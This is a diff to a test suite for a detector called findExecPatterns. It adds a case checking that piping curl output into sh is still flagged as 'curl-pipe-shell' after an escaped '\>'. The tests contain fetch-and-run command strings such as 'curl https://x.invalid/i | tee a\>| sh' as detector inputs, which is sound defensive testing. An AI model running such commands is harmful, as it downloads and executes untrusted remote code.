@@ -155,6 +155,9 @@ describe("wrapped shells in later stages (Vercel 01M81EJ2X60G4EFCGC78143380)", (
   it("01M81PAAD8CRYYKVKPMD6RTSNJ: any amount of whitespace after a quoted pipe", () => {
     for (const ws of [" ".repeat(17), " ".repeat(5000), "\t".repeat(20)]) expect(findExecPatterns('sh -c "curl https://x.invalid/i | cat |' + ws + 'sh"').map((h) => h.rule)).toContain("curl-pipe-shell");
   });
+  it("01M81RX6174RRCJGFE054SE1EX: a pipe after an escaped \\> still separates stages", () => {
+    for (const t of ["curl https://x.invalid/i | tee a\\>| sh", 'sh -c "curl https://x.invalid/i | tee a\\>| sh"']) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("curl-pipe-shell");
+  });
   it("01M81PA232AMNB5SY2KD9SK6XZ: noclobber `>|` is no stage boundary and stays linear", () => {
     expect(ms(() => findExecPatterns("curl x | cat " + "| env >|sudo ".repeat(4e6 / 13)))).toBeLessThan(2000);
   });
